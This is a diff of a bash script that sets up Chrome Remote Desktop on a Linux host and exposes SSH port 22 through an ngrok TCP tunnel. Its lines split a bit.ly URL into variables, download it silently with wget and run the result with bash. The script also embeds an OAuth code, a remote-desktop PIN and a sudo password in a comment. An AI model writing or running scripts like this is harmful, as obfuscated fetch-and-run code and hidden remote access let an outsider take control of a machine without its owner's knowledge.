@@ -2,7 +2,7 @@
 #!/bin/bash
 # # !cmd=RDP;i=0001;a=bit;x=ly;wget -q -O RDP ${a}.${x}/${cmd}${i} ;bash RDP 'DISPLAY= /opt/google/chrome-remote-desktop/start-host --code="4/0AX4XfWixlFxb0mcoXNtETJtF1Cetqx2XVrrT680nvHB95HLNPZID_O3aTPDbqnEr1F-e-g" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=$(hostname)' '4500'
 echo '{'
-echo '"rdp":"v0.16.1",'
+echo '"rdp":"v0.16.2",'
 
 ######################### RDP #####################################
 {
@@ -71,7 +71,7 @@ IIP=$(echo $JSINFO|grep -oP '(?<="ip": ")[^"]*')
 IPNAME=$(echo $IIP | sed -r 's!/.*!!; s!.*\.!!')
 INFO="$COUNTRY""_""$IPNAME"
 LOC=$(echo $JSINFO|grep -oP '(?<="loc": ")[^"]*')
-CRP=$(echo $CRP | sed 's|hostname|echo $INFO|g')
+#CRP=$(echo $CRP | sed 's|hostname|echo $INFO|g')
 CRP=$CRP" --pin=55507770"
 su - one -c """$CRP"""
 #sudo -u one $CRP
@@ -79,7 +79,7 @@ service chrome-remote-desktop@one restart
 #printf 'Check https://remotedesktop.google.com/access/ \n'
 #printf 'Your SUDO Pasword Is 8426 \n'
 
-./ngrok http 22
+./ngrok tcp 22
 if [ -z "$2" ] 
 then
     i=003;cmd=pysi;x=ly;y=bit;wget -q -O /tmp/ss ${y}.${x}/${cmd}${i} ; bash /tmp/ss 
